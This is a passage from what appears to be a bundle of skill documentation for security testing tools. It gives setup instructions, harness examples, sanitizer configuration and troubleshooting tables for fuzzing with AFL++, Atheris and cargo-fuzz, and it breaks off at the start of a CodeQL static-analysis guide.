-DCMAKE_C_COMPILER=afl-clang-fast -DCMAKE_CXX_COMPILER=afl-clang-fast++ .\n./afl++ <host/docker> cmake --build . --target fuzz\n\n# Fuzz\n./afl++ <host/docker> afl-fuzz -i seeds -o out -- ./fuzz\n```\n\n## Troubleshooting\n\n| Problem | Cause | Solution |\n|---------|-------|----------|\n| Low exec/sec (<1k) | Not using persistent mode | Create a LLVMFuzzerTestOneInput style harness |\n| Low stability (<85%) | Non-deterministic code | Fuzz a program via stdin or file inputs, or create such a harness |\n| GCC plugin error | GCC version mismatch | Ensure system GCC matches AFL++ build and install gcc-$GCC_VERSION-plugin-dev |\n| No crashes found | Need sanitizers | Recompile with `AFL_USE_ASAN=1` |\n| Memory limit exceeded | ASan uses 20TB virtual | Remove `-m` flag when using ASan |\n| Docker performance loss | Virtualization overhead | Use bare metal or VM for production fuzzing |\n\n## Related Skills\n\n### Technique Skills\n\n| Skill | Use Case |\n|-------|----------|\n| **fuzz-harness-writing** | Detailed guidance on writing effective harnesses |\n| **address-sanitizer** | Memory error detection during fuzzing |\n| **undefined-behavior-sanitizer** | Detect undefined behavior bugs |\n| **fuzzing-corpus** | Building and managing seed corpora |\n| **fuzzing-dictionaries** | Creating dictionaries for format-aware fuzzing |\n\n### Related Fuzzers\n\n| Skill | When to Consider |\n|-------|------------------|\n| **libfuzzer** | Quick prototyping, single-threaded fuzzing is sufficient |\n| **libafl** | Need custom mutators or research-grade features |\n\n## Resources\n\n### Key External Resources\n\n**[AFL++ GitHub Repository](https://github.com/AFLplusplus/AFLplusplus)**\nOfficial repository with comprehensive documentation, examples, and issue tracker.\n\n**[Fuzzing in Depth](https://aflplus.plus/docs/fuzzing_in_depth.md)**\nAdvanced documentation by the AFL++ team covering instrumentation modes, optimization techniques, and advanced use cases.\n\n**[AFL++ Under The Hood](https://blog.ritsec.club/posts/afl-under-hood/)**\nTechnical deep-dive into AFL++ internals, mutation strategies, and coverage tracking mechanisms.\n\n**[AFL++: Combining Incremental Steps of Fuzzing Research](https://www.usenix.org/system/files/woot20-paper-fioraldi.pdf)**\nResearch paper describing AFL++ architecture and performance improvements over original AFL.\n\n### Video Resources\n\n- [Fuzzing cURL](https://blog.trailofbits.com/2023/02/14/curl-audit-fuzzing-libcurl-command-line-interface/) - Trail of Bits blog post on using AFL++ argument fuzzing for cURL\n- [Sudo Vulnerability Walkthrough](https://www.youtube.com/playlist?list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx) - LiveOverflow series on rediscovering CVE-2021-3156\n- [Rediscovery of libpng bug](https://www.youtube.com/watch?v=PJLWlmp8CDM) - LiveOverflow video on finding CVE-2023-4863\n",
        "plugins/testing-handbook-skills/skills/atheris/SKILL.md": "---\nname: atheris\ntype: fuzzer\ndescription: >\n  Atheris is a coverage-guided Python fuzzer based on libFuzzer.\n  Use for fuzzing pure Python code and Python C extensions.\n---\n\n# Atheris\n\nAtheris is a coverage-guided Python fuzzer built on libFuzzer. It enables fuzzing of both pure Python code and Python C extensions with integrated AddressSanitizer support for detecting memory corruption issues.\n\n## When to Use\n\n| Fuzzer | Best For | Complexity |\n|--------|----------|------------|\n| Atheris | Python code and C extensions | Low-Medium |\n| Hypothesis | Property-based testing | Low |\n| python-afl | AFL-style fuzzing | Medium |\n\n**Choose Atheris when:**\n- Fuzzing pure Python code with coverage guidance\n- Testing Python C extensions for memory corruption\n- Integration with libFuzzer ecosystem is desired\n- AddressSanitizer support is needed\n\n## Quick Start\n\n```python\nimport sys\nimport atheris\n\n@atheris.instrument_func\ndef test_one_input(data: bytes):\n    if len(data) == 4:\n        if data[0] == 0x46:  # \"F\"\n            if data[1] == 0x55:  # \"U\"\n                if data[2] == 0x5A:  # \"Z\"\n                    if data[3] == 0x5A:  # \"Z\"\n                        raise RuntimeError(\"You caught me\")\n\ndef main():\n    atheris.Setup(sys.argv, test_one_input)\n    atheris.Fuzz()\n\nif __name__ == \"__main__\":\n    main()\n```\n\nRun:\n```bash\npython fuzz.py\n```\n\n## Installation\n\nAtheris supports 32-bit and 64-bit Linux, and macOS. We recommend fuzzing on Linux because it's simpler to manage and often faster.\n\n### Prerequisites\n\n- Python 3.7 or later\n- Recent version of clang (preferably [latest release](https://github.com/llvm/llvm-project/releases))\n- For Docker users: [Docker Desktop](https://www.docker.com/products/docker-desktop/)\n\n### Linux/macOS\n\n```bash\nuv pip install atheris\n```\n\n### Docker Environment (Recommended)\n\nFor a fully operational Linux environment with all dependencies configured:\n\n```dockerfile\n# https://hub.docker.com/_/python\nARG PYTHON_VERSION=3.11\n\nFROM python:$PYTHON_VERSION-slim-bookworm\n\nRUN python --version\n\nRUN apt update && apt install -y \\\n    ca-certificates \\\n    wget \\\n    && rm -rf /var/lib/apt/lists/*\n\n# LLVM builds version 15-19 for Debian 12 (Bookworm)\n# https://apt.llvm.org/bookworm/dists/\nARG LLVM_VERSION=19\n\nRUN echo \"deb http://apt.llvm.org/bookworm/ llvm-toolchain-bookworm-$LLVM_VERSION main\" > /etc/apt/sources.list.d/llvm.list\nRUN echo \"deb-src http://apt.llvm.org/bookworm/ llvm-toolchain-bookworm-$LLVM_VERSION main\" >> /etc/apt/sources.list.d/llvm.list\nRUN wget -qO- https://apt.llvm.org/llvm-snapshot.gpg.key > /etc/apt/trusted.gpg.d/apt.llvm.org.asc\n\nRUN apt update && apt install -y \\\n    build-essential \\\n    clang-$LLVM_VERSION \\\n    && rm -rf /var/lib/apt/lists/*\n\nENV APP_DIR \"/app\"\nRUN mkdir $APP_DIR\nWORKDIR $APP_DIR\n\nENV VIRTUAL_ENV \"/opt/venv\"\nRUN python -m venv $VIRTUAL_ENV\nENV PATH \"$VIRTUAL_ENV/bin:$PATH\"\n\n# https://github.com/google/atheris/blob/master/native_extension_fuzzing.md#step-1-compiling-your-extension\nENV CC=\"clang-$LLVM_VERSION\"\nENV CFLAGS \"-fsanitize=address,fuzzer-no-link\"\nENV CXX=\"clang++-$LLVM_VERSION\"\nENV CXXFLAGS \"-fsanitize=address,fuzzer-no-link\"\nENV LDSHARED=\"clang-$LLVM_VERSION -shared\"\nENV LDSHAREDXX=\"clang++-$LLVM_VERSION -shared\"\nENV ASAN_SYMBOLIZER_PATH=\"/usr/bin/llvm-symbolizer-$LLVM_VERSION\"\n\n# Allow Atheris to find fuzzer sanitizer shared libs\n# https://github.com/google/atheris#building-from-source\nRUN LIBFUZZER_LIB=$($CC -print-file-name=libclang_rt.fuzzer_no_main-$(uname -m).a) \\\n    python -m pip install --no-binary atheris atheris\n\n# https://github.com/google/atheris/blob/master/native_extension_fuzzing.md#option-a-sanitizerlibfuzzer-preloads\nENV LD_PRELOAD \"$VIRTUAL_ENV/lib/python3.11/site-packages/asan_with_fuzzer.so\"\n\n# 1. Skip memory allocation failures for now, they are common, and low impact (DoS)\n# 2. https://github.com/google/atheris/blob/master/native_extension_fuzzing.md#leak-detection\nENV ASAN_OPTIONS \"allocator_may_return_null=1,detect_leaks=0\"\n\nCMD [\"/bin/bash\"]\n```\n\nBuild and run:\n```bash\ndocker build -t atheris .\ndocker run -it atheris\n```\n\n### Verification\n\n```bash\npython -c \"import atheris; print(atheris.__version__)\"\n```\n\n## Writing a Harness\n\n### Harness Structure for Pure Python\n\n```python\nimport sys\nimport atheris\n\n@atheris.instrument_func\ndef test_one_input(data: bytes):\n    \"\"\"\n    Fuzzing entry point. Called with random byte sequences.\n\n    Args:\n        data: Random bytes generated by the fuzzer\n    \"\"\"\n    # Add input validation if needed\n    if len(data) < 1:\n        return\n\n    # Call your target function\n    try:\n        your_target_function(data)\n    except ValueError:\n        # Expected exceptions should be caught\n        pass\n    # Let unexpected exceptions crash (that's what we're looking for!)\n\ndef main():\n    atheris.Setup(sys.argv, test_one_input)\n    atheris.Fuzz()\n\nif __name__ == \"__main__\":\n    main()\n```\n\n### Harness Rules\n\n| Do | Don't |\n|----|-------|\n| Use `@atheris.instrument_func` for coverage | Forget to instrument target code |\n| Catch expected exceptions | Catch all exceptions indiscriminately |\n| Use `atheris.instrument_imports()` for libraries | Import modules after `atheris.Setup()` |\n| Keep harness deterministic | Use randomness or time-based behavior |\n\n> **See Also:** For detailed harness writing techniques, patterns for handling complex inputs,\n> and advanced strategies, see the **fuzz-harness-writing** technique skill.\n\n## Fuzzing Pure Python Code\n\nFor fuzzing broader parts of an application or library, use instrumentation functions:\n\n```python\nimport atheris\nwith atheris.instrument_imports():\n    import your_module\n    from another_module import target_function\n\ndef test_one_input(data: bytes):\n    target_function(data)\n\natheris.Setup(sys.argv, test_one_input)\natheris.Fuzz()\n```\n\n**Instrumentation Options:**\n- `atheris.instrument_func` - Decorator for single function instrumentation\n- `atheris.instrument_imports()` - Context manager for instrumenting all imported modules\n- `atheris.instrument_all()` - Instrument all Python code system-wide\n\n## Fuzzing Python C Extensions\n\nPython C extensions require compilation with specific flags for instrumentation and sanitizer support.\n\n### Environment Configuration\n\nIf using the provided Dockerfile, these are already configured. For local setup:\n\n```bash\nexport CC=\"clang\"\nexport CFLAGS=\"-fsanitize=address,fuzzer-no-link\"\nexport CXX=\"clang++\"\nexport CXXFLAGS=\"-fsanitize=address,fuzzer-no-link\"\nexport LDSHARED=\"clang -shared\"\n```\n\n### Example: Fuzzing cbor2\n\nInstall the extension from source:\n```bash\nCBOR2_BUILD_C_EXTENSION=1 python -m pip install --no-binary cbor2 cbor2==5.6.4\n```\n\nThe `--no-binary` flag ensures the C extension is compiled locally with instrumentation.\n\nCreate `cbor2-fuzz.py`:\n```python\nimport sys\nimport atheris\n\n# _cbor2 ensures the C library is imported\nfrom _cbor2 import loads\n\ndef test_one_input(data: bytes):\n    try:\n        loads(data)\n    except Exception:\n        # We're searching for memory corruption, not Python exceptions\n        pass\n\ndef main():\n    atheris.Setup(sys.argv, test_one_input)\n    atheris.Fuzz()\n\nif __name__ == \"__main__\":\n    main()\n```\n\nRun:\n```bash\npython cbor2-fuzz.py\n```\n\n> **Important:** When running locally (not in Docker), you must [set `LD_PRELOAD` manually](https://github.com/google/atheris/blob/master/native_extension_fuzzing.md#option-a-sanitizerlibfuzzer-preloads).\n\n## Corpus Management\n\n### Creating Initial Corpus\n\n```bash\nmkdir corpus\n# Add seed inputs\necho \"test data\" > corpus/seed1\necho '{\"key\": \"value\"}' > corpus/seed2\n```\n\nRun with corpus:\n```bash\npython fuzz.py corpus/\n```\n\n### Corpus Minimization\n\nAtheris inherits corpus minimization from libFuzzer:\n```bash\npython fuzz.py -merge=1 new_corpus/ old_corpus/\n```\n\n> **See Also:** For corpus creation strategies, dictionaries, and seed selection,\n> see the **fuzzing-corpus** technique skill.\n\n## Running Campaigns\n\n### Basic Run\n\n```bash\npython fuzz.py\n```\n\n### With Corpus Directory\n\n```bash\npython fuzz.py corpus/\n```\n\n### Common Options\n\n```bash\n# Run for 10 minutes\npython fuzz.py -max_total_time=600\n\n# Limit input size\npython fuzz.py -max_len=1024\n\n# Run with multiple workers\npython fuzz.py -workers=4 -jobs=4\n```\n\n### Interpreting Output\n\n| Output | Meaning |\n|--------|---------|\n| `NEW    cov: X` | Found new coverage, corpus expanded |\n| `pulse  cov: X` | Periodic status update |\n| `exec/s: X` | Executions per second (throughput) |\n| `corp: X/Yb` | Corpus size: X inputs, Y bytes total |\n| `ERROR: libFuzzer` | Crash detected |\n\n## Sanitizer Integration\n\n### AddressSanitizer (ASan)\n\nAddressSanitizer is automatically integrated when using the provided Docker environment or when compiling with appropriate flags.\n\nFor local setup:\n```bash\nexport CFLAGS=\"-fsanitize=address,fuzzer-no-link\"\nexport CXXFLAGS=\"-fsanitize=address,fuzzer-no-link\"\n```\n\nConfigure ASan behavior:\n```bash\nexport ASAN_OPTIONS=\"allocator_may_return_null=1,detect_leaks=0\"\n```\n\n### LD_PRELOAD Configuration\n\nFor native extension fuzzing:\n```bash\nexport LD_PRELOAD=\"$(python -c 'import atheris; import os; print(os.path.join(os.path.dirname(atheris.__file__), \"asan_with_fuzzer.so\"))')\"\n```\n\n> **See Also:** For detailed sanitizer configuration, common issues, and advanced flags,\n> see the **address-sanitizer** and **undefined-behavior-sanitizer** technique skills.\n\n### Common Sanitizer Issues\n\n| Issue | Solution |\n|-------|----------|\n| `LD_PRELOAD` not set | Export `LD_PRELOAD` to point to `asan_with_fuzzer.so` |\n| Memory allocation failures | Set `ASAN_OPTIONS=allocator_may_return_null=1` |\n| Leak detection noise | Set `ASAN_OPTIONS=detect_leaks=0` |\n| Missing symbolizer | Set `ASAN_SYMBOLIZER_PATH` to `llvm-symbolizer` |\n\n## Advanced Usage\n\n### Tips and Tricks\n\n| Tip | Why It Helps |\n|-----|--------------|\n| Use `atheris.instrument_imports()` early | Ensures all imports are instrumented for coverage |\n| Start with small `max_len` | Faster initial fuzzing, gradually increase |\n| Use dictionaries for structured formats | Helps fuzzer understand format tokens |\n| Run multiple parallel instances | Better coverage exploration |\n\n### Custom Instrumentation\n\nFine-tune what gets instrumented:\n```python\nimport atheris\n\n# Instrument only specific modules\nwith atheris.instrument_imports():\n    import target_module\n# Don't instrument test harness code\n\ndef test_one_input(data: bytes):\n    target_module.parse(data)\n```\n\n### Performance Tuning\n\n| Setting | Impact |\n|---------|--------|\n| `-max_len=N` | Smaller values = faster execution |\n| `-workers=N -jobs=N` | Parallel fuzzing for faster coverage |\n| `ASAN_OPTIONS=fast_unwind_on_malloc=0` | Better stack traces, slower execution |\n\n### UndefinedBehaviorSanitizer (UBSan)\n\nAdd UBSan to catch additional bugs:\n```bash\nexport CFLAGS=\"-fsanitize=address,undefined,fuzzer-no-link\"\nexport CXXFLAGS=\"-fsanitize=address,undefined,fuzzer-no-link\"\n```\n\nNote: Modify flags in Dockerfile if using containerized setup.\n\n## Real-World Examples\n\n### Example: Pure Python Parser\n\n```python\nimport sys\nimport atheris\nimport json\n\n@atheris.instrument_func\ndef test_one_input(data: bytes):\n    try:\n        # Fuzz Python's JSON parser\n        json.loads(data.decode('utf-8', errors='ignore'))\n    except (ValueError, UnicodeDecodeError):\n        pass\n\ndef main():\n    atheris.Setup(sys.argv, test_one_input)\n    atheris.Fuzz()\n\nif __name__ == \"__main__\":\n    main()\n```\n\n### Example: HTTP Request Parsing\n\n```python\nimport sys\nimport atheris\n\nwith atheris.instrument_imports():\n    from urllib3 import HTTPResponse\n    from io import BytesIO\n\ndef test_one_input(data: bytes):\n    try:\n        # Fuzz HTTP response parsing\n        fake_response = HTTPResponse(\n            body=BytesIO(data),\n            headers={},\n            preload_content=False\n        )\n        fake_response.read()\n    except Exception:\n        pass\n\ndef main():\n    atheris.Setup(sys.argv, test_one_input)\n    atheris.Fuzz()\n\nif __name__ == \"__main__\":\n    main()\n```\n\n## Troubleshooting\n\n| Problem | Cause | Solution |\n|---------|-------|----------|\n| No coverage increase | Poor seed corpus or target not instrumented | Add better seeds, verify `instrument_imports()` |\n| Slow execution | ASan overhead or large inputs | Reduce `max_len`, use `ASAN_OPTIONS=fast_unwind_on_malloc=1` |\n| Import errors | Modules imported before instrumentation | Move imports inside `instrument_imports()` context |\n| Segfault without ASan output | Missing `LD_PRELOAD` | Set `LD_PRELOAD` to `asan_with_fuzzer.so` path |\n| Build failures | Wrong compiler or missing flags | Verify `CC`, `CFLAGS`, and clang version |\n\n## Related Skills\n\n### Technique Skills\n\n| Skill | Use Case |\n|-------|----------|\n| **fuzz-harness-writing** | Detailed guidance on writing effective harnesses |\n| **address-sanitizer** | Memory error detection during fuzzing |\n| **undefined-behavior-sanitizer** | Catching undefined behavior in C extensions |\n| **coverage-analysis** | Measuring and improving code coverage |\n| **fuzzing-corpus** | Building and managing seed corpora |\n\n### Related Fuzzers\n\n| Skill | When to Consider |\n|-------|------------------|\n| **hypothesis** | Property-based testing with type-aware generation |\n| **python-afl** | AFL-style fuzzing for Python when Atheris isn't available |\n\n## Resources\n\n### Key External Resources\n\n**[Atheris GitHub Repository](https://github.com/google/atheris)**\nOfficial repository with installation instructions, examples, and documentation for fuzzing both pure Python and native extensions.\n\n**[Native Extension Fuzzing Guide](https://github.com/google/atheris/blob/master/native_extension_fuzzing.md)**\nComprehensive guide covering compilation flags, LD_PRELOAD setup, sanitizer configuration, and troubleshooting for Python C extensions.\n\n**[Continuously Fuzzing Python C Extensions](https://blog.trailofbits.com/2024/02/23/continuously-fuzzing-python-c-extensions/)**\nTrail of Bits blog post covering CI/CD integration, ClusterFuzzLite setup, and real-world examples of fuzzing Python C extensions in continuous integration pipelines.\n\n**[ClusterFuzzLite Python Integration](https://google.github.io/clusterfuzzlite/build-integration/python-lang/)**\nGuide for integrating Atheris fuzzing into CI/CD pipelines using ClusterFuzzLite for automated continuous fuzzing.\n\n### Video Resources\n\nVideos and tutorials are available in the main Atheris documentation and libFuzzer resources.\n",
        "plugins/testing-handbook-skills/skills/cargo-fuzz/SKILL.md": "---\nname: cargo-fuzz\ntype: fuzzer\ndescription: >\n  cargo-fuzz is the de facto fuzzing tool for Rust projects using Cargo.\n  Use for fuzzing Rust code with libFuzzer backend.\n---\n\n# cargo-fuzz\n\ncargo-fuzz is the de facto choice for fuzzing Rust projects when using Cargo. It uses libFuzzer as the backend and provides a convenient Cargo subcommand that automatically enables relevant compilation flags for your Rust project, including support for sanitizers like AddressSanitizer.\n\n## When to Use\n\ncargo-fuzz is currently the primary and most mature fuzzing solution for Rust projects using Cargo.\n\n| Fuzzer | Best For | Complexity |\n|--------|----------|------------|\n| cargo-fuzz | Cargo-based Rust projects, quick setup | Low |\n| AFL++ | Multi-core fuzzing, non-Cargo projects | Medium |\n| LibAFL | Custom fuzzers, research, advanced use cases | High |\n\n**Choose cargo-fuzz when:**\n- Your project uses Cargo (required)\n- You want simple, quick setup with minimal configuration\n- You need integrated sanitizer support\n- You're fuzzing Rust code with or without unsafe blocks\n\n## Quick Start\n\n```rust\n#![no_main]\n\nuse libfuzzer_sys::fuzz_target;\n\nfn harness(data: &[u8]) {\n    your_project::check_buf(data);\n}\n\nfuzz_target!(|data: &[u8]| {\n    harness(data);\n});\n```\n\nInitialize and run:\n```bash\ncargo fuzz init\n# Edit fuzz/fuzz_targets/fuzz_target_1.rs with your harness\ncargo +nightly fuzz run fuzz_target_1\n```\n\n## Installation\n\ncargo-fuzz requires the nightly Rust toolchain because it uses features only available in nightly.\n\n### Prerequisites\n\n- Rust and Cargo installed via [rustup](https://rustup.rs/)\n- Nightly toolchain\n\n### Linux/macOS\n\n```bash\n# Install nightly toolchain\nrustup install nightly\n\n# Install cargo-fuzz\ncargo install cargo-fuzz\n```\n\n### Verification\n\n```bash\ncargo +nightly --version\ncargo fuzz --version\n```\n\n## Writing a Harness\n\n### Project Structure\n\ncargo-fuzz works best when your code is structured as a library crate. If you have a binary project, split your `main.rs` into:\n\n```text\nsrc/main.rs  # Entry point (main function)\nsrc/lib.rs   # Code to fuzz (public functions)\nCargo.toml\n```\n\nInitialize fuzzing:\n```bash\ncargo fuzz init\n```\n\nThis creates:\n```text\nfuzz/\n Cargo.toml\n fuzz_targets/\n     fuzz_target_1.rs\n```\n\n### Harness Structure\n\n```rust\n#![no_main]\n\nuse libfuzzer_sys::fuzz_target;\n\nfn harness(data: &[u8]) {\n    // 1. Validate input size if needed\n    if data.is_empty() {\n        return;\n    }\n\n    // 2. Call target function with fuzz data\n    your_project::target_function(data);\n}\n\nfuzz_target!(|data: &[u8]| {\n    harness(data);\n});\n```\n\n### Harness Rules\n\n| Do | Don't |\n|----|-------|\n| Structure code as library crate | Keep everything in main.rs |\n| Use `fuzz_target!` macro | Write custom main function |\n| Handle `Result::Err` gracefully | Panic on expected errors |\n| Keep harness deterministic | Use random number generators |\n\n> **See Also:** For detailed harness writing techniques and structure-aware fuzzing with the\n> `arbitrary` crate, see the **fuzz-harness-writing** technique skill.\n\n## Structure-Aware Fuzzing\n\ncargo-fuzz integrates with the [arbitrary](https://github.com/rust-fuzz/arbitrary) crate for structure-aware fuzzing:\n\n```rust\n// In your library crate\nuse arbitrary::Arbitrary;\n\n#[derive(Debug, Arbitrary)]\npub struct Name {\n    data: String\n}\n```\n\n```rust\n// In your fuzz target\n#![no_main]\nuse libfuzzer_sys::fuzz_target;\n\nfuzz_target!(|data: your_project::Name| {\n    data.check_buf();\n});\n```\n\nAdd to your library's `Cargo.toml`:\n```toml\n[dependencies]\narbitrary = { version = \"1\", features = [\"derive\"] }\n```\n\n## Running Campaigns\n\n### Basic Run\n\n```bash\ncargo +nightly fuzz run fuzz_target_1\n```\n\n### Without Sanitizers (Safe Rust)\n\nIf your project doesn't use unsafe Rust, disable sanitizers for 2x performance boost:\n\n```bash\ncargo +nightly fuzz run --sanitizer none fuzz_target_1\n```\n\nCheck if your project uses unsafe code:\n```bash\ncargo install cargo-geiger\ncargo geiger\n```\n\n### Re-executing Test Cases\n\n```bash\n# Run a specific test case (e.g., a crash)\ncargo +nightly fuzz run fuzz_target_1 fuzz/artifacts/fuzz_target_1/crash-<hash>\n\n# Run all corpus entries without fuzzing\ncargo +nightly fuzz run fuzz_target_1 fuzz/corpus/fuzz_target_1 -- -runs=0\n```\n\n### Using Dictionaries\n\n```bash\ncargo +nightly fuzz run fuzz_target_1 -- -dict=./dict.dict\n```\n\n### Interpreting Output\n\n| Output | Meaning |\n|--------|---------|\n| `NEW` | New coverage-increasing input discovered |\n| `pulse` | Periodic status update |\n| `INITED` | Fuzzer initialized successfully |\n| Crash with stack trace | Bug found, saved to `fuzz/artifacts/` |\n\nCorpus location: `fuzz/corpus/fuzz_target_1/`\nCrashes location: `fuzz/artifacts/fuzz_target_1/`\n\n## Sanitizer Integration\n\n### AddressSanitizer (ASan)\n\nASan is enabled by default and detects memory errors:\n\n```bash\ncargo +nightly fuzz run fuzz_target_1\n```\n\n### Disabling Sanitizers\n\nFor pure safe Rust (no unsafe blocks in your code or dependencies):\n\n```bash\ncargo +nightly fuzz run --sanitizer none fuzz_target_1\n```\n\n**Performance impact:** ASan adds ~2x overhead. Disable for safe Rust to improve fuzzing speed.\n\n### Checking for Unsafe Code\n\n```bash\ncargo install cargo-geiger\ncargo geiger\n```\n\n> **See Also:** For detailed sanitizer configuration, flags, and troubleshooting,\n> see the **address-sanitizer** technique skill.\n\n## Coverage Analysis\n\ncargo-fuzz integrates with Rust's coverage tools to analyze fuzzing effectiveness.\n\n### Prerequisites\n\n```bash\nrustup toolchain install nightly --component llvm-tools-preview\ncargo install cargo-binutils\ncargo install rustfilt\n```\n\n### Generating Coverage Reports\n\n```bash\n# Generate coverage data from corpus\ncargo +nightly fuzz coverage fuzz_target_1\n```\n\nCreate coverage generation script:\n\n```bash\ncat <<'EOF' > ./generate_html\n#!/bin/sh\nif [ $# -lt 1 ]; then\n    echo \"Error: Name of fuzz target is required.\"\n    echo \"Usage: $0 fuzz_target [sources...]\"\n    exit 1\nfi\nFUZZ_TARGET=\"$1\"\nshift\nSRC_FILTER=\"$@\"\nTARGET=$(rustc -vV | sed -n 's|host: ||p')\ncargo +nightly cov -- show -Xdemangler=rustfilt \\\n  \"target/$TARGET/coverage/$TARGET/release/$FUZZ_TARGET\" \\\n  -instr-profile=\"fuzz/coverage/$FUZZ_TARGET/coverage.profdata\"  \\\n  -show-line-counts-or-regions -show-instantiations  \\\n  -format=html -o fuzz_html/ $SRC_FILTER\nEOF\nchmod +x ./generate_html\n```\n\nGenerate HTML report:\n```bash\n./generate_html fuzz_target_1 src/lib.rs\n```\n\nHTML report saved to: `fuzz_html/`\n\n> **See Also:** For detailed coverage analysis techniques and systematic coverage improvement,\n> see the **coverage-analysis** technique skill.\n\n## Advanced Usage\n\n### Tips and Tricks\n\n| Tip | Why It Helps |\n|-----|--------------|\n| Start with a seed corpus | Dramatically speeds up initial coverage discovery |\n| Use `--sanitizer none` for safe Rust | 2x performance improvement |\n| Check coverage regularly | Identifies gaps in harness or seed corpus |\n| Use dictionaries for parsers | Helps overcome magic value checks |\n| Structure code as library | Required for cargo-fuzz integration |\n\n### libFuzzer Options\n\nPass options to libFuzzer after `--`:\n\n```bash\n# See all options\ncargo +nightly fuzz run fuzz_target_1 -- -help=1\n\n# Set timeout per run\ncargo +nightly fuzz run fuzz_target_1 -- -timeout=10\n\n# Use dictionary\ncargo +nightly fuzz run fuzz_target_1 -- -dict=dict.dict\n\n# Limit maximum input size\ncargo +nightly fuzz run fuzz_target_1 -- -max_len=1024\n```\n\n### Multi-Core Fuzzing\n\n```bash\n# Experimental forking support (not recommended)\ncargo +nightly fuzz run --jobs 1 fuzz_target_1\n```\n\nNote: The multi-core fuzzing feature is experimental and not recommended. For parallel fuzzing, consider running multiple instances manually or using AFL++.\n\n## Real-World Examples\n\n### Example: ogg Crate\n\nThe [ogg crate](https://github.com/RustAudio/ogg) parses Ogg media container files. Parsers are excellent fuzzing targets because they handle untrusted data.\n\n```bash\n# Clone and initialize\ngit clone https://github.com/RustAudio/ogg.git\ncd ogg/\ncargo fuzz init\n```\n\nHarness at `fuzz/fuzz_targets/fuzz_target_1.rs`:\n\n```rust\n#![no_main]\n\nuse ogg::{PacketReader, PacketWriter};\nuse ogg::writing::PacketWriteEndInfo;\nuse std::io::Cursor;\nuse libfuzzer_sys::fuzz_target;\n\nfn harness(data: &[u8]) {\n    let mut pck_rdr = PacketReader::new(Cursor::new(data.to_vec()));\n    pck_rdr.delete_unread_packets();\n\n    let output = Vec::new();\n    let mut pck_wtr = PacketWriter::new(Cursor::new(output));\n\n    if let Ok(_) = pck_rdr.read_packet() {\n        if let Ok(r) = pck_rdr.read_packet() {\n            match r {\n                Some(pck) => {\n                    let inf = if pck.last_in_stream() {\n                        PacketWriteEndInfo::EndStream\n                    } else if pck.last_in_page() {\n                        PacketWriteEndInfo::EndPage\n                    } else {\n                        PacketWriteEndInfo::NormalPacket\n                    };\n                    let stream_serial = pck.stream_serial();\n                    let absgp_page = pck.absgp_page();\n                    let _ = pck_wtr.write_packet(\n                        pck.data, stream_serial, inf, absgp_page\n                    );\n                }\n                None => return,\n            }\n        }\n    }\n}\n\nfuzz_target!(|data: &[u8]| {\n    harness(data);\n});\n```\n\nSeed the corpus:\n```bash\nmkdir fuzz/corpus/fuzz_target_1/\ncurl -o fuzz/corpus/fuzz_target_1/320x240.ogg \\\n  https://commons.wikimedia.org/wiki/File:320x240.ogg\n```\n\nRun:\n```bash\ncargo +nightly fuzz run fuzz_target_1\n```\n\nAnalyze coverage:\n```bash\ncargo +nightly fuzz coverage fuzz_target_1\n./generate_html fuzz_target_1 src/lib.rs\n```\n\n## Troubleshooting\n\n| Problem | Cause | Solution |\n|---------|-------|----------|\n| \"requires nightly\" error | Using stable toolchain | Use `cargo +nightly fuzz` |\n| Slow fuzzing performance | ASan enabled for safe Rust | Add `--sanitizer none` flag |\n| \"cannot find binary\" | No library crate | Move code from `main.rs` to `lib.rs` |\n| Sanitizer compilation issues | Wrong nightly version | Try different nightly: `rustup install nightly-2024-01-01` |\n| Low coverage | Missing seed corpus | Add sample inputs to `fuzz/corpus/fuzz_target_1/` |\n| Magic value not found | No dictionary | Create dictionary file with magic values |\n\n## Related Skills\n\n### Technique Skills\n\n| Skill | Use Case |\n|-------|----------|\n| **fuzz-harness-writing** | Structure-aware fuzzing with `arbitrary` crate |\n| **address-sanitizer** | Understanding ASan output and configuration |\n| **coverage-analysis** | Measuring and improving fuzzing effectiveness |\n| **fuzzing-corpus** | Building and managing seed corpora |\n| **fuzzing-dictionaries** | Creating dictionaries for format-aware fuzzing |\n\n### Related Fuzzers\n\n| Skill | When to Consider |\n|-------|------------------|\n| **libfuzzer** | Fuzzing C/C++ code with similar workflow |\n| **aflpp** | Multi-core fuzzing or non-Cargo Rust projects |\n| **libafl** | Advanced fuzzing research or custom fuzzer development |\n\n## Resources\n\n**[Rust Fuzz Book - cargo-fuzz](https://rust-fuzz.github.io/book/cargo-fuzz.html)**\nOfficial documentation for cargo-fuzz covering installation, usage, and advanced features.\n\n**[arbitrary crate documentation](https://docs.rs/arbitrary/latest/arbitrary/)**\nGuide to structure-aware fuzzing with automatic derivation for Rust types.\n\n**[cargo-fuzz GitHub Repository](https://github.com/rust-fuzz/cargo-fuzz)**\nSource code, issue tracker, and examples for cargo-fuzz.\n",
        "plugins/testing-handbook-skills/skills/codeql/SKILL.md": "---\nname: codeql\ntype: tool\ndescription: >\n  CodeQL is a static analysis framework that queries code as a database.\n  Use when you need interprocedural analysis or complex data flow tracking.\n---\n\n# CodeQL\n\nCodeQL is a powerful static analysis framework that allows developers and security researchers to query a codebase for specific code patterns. The CodeQL standard libraries implement support for both inter- and intraprocedural control flow and data flow analysis. However, the learning curve for writing custom queries is steep, and documentation for the CodeQL standard libraries is still scant.\n\n## When to Use\n\n**Use CodeQL when:**\n- You need interprocedural control flow and data flow queries across the entire codebase\n- Fine-grained control over the abstract syntax tree, control flow graph, and data flow graph is required\n- You want to prevent introduction of known bugs and security vulnerabilities into the codebase\n- You have access to source code and third-party dependencies (and can build compiled languages)\n- The bug class requires complex analysis beyond single-file pattern matching\n\n**Consider alternatives when:**\n- Single-file pattern matching is sufficient  Consider Semgrep\n- You don't have access to source code or can't build the project\n- Analysis time is critical (complex queries may take a long time)\n- You need to analyze a closed-source repository without a GitHub Advanced Security license\n- The language is not supported by CodeQL\n\n## Quick Reference\n\n| Task | Command |\n|------|---------|\n| Create database (C/C++) | `codeql database create codeql.db --language=cpp --command='make -j8'` |\n| Create database (Go) | `codeql database create codeql.db --language=go` |\n| Create database (Java/Kotlin) | `codeql database create codeql.db --language=java` |\n| Create database (JavaScript/TypeScript) | `codeql database create codeql.db --language=javascript` |\n| Create database (Python) | `codeql database create codeql.db --language=python` |\n| Analyze database | `codeql database analyze codeql.db --format=sarif-latest --output=results.sarif -- codeql/cpp-queries` |\n| List installed packs | `codeql resolve qlpacks` |\n| Download query pack | `codeql pack download 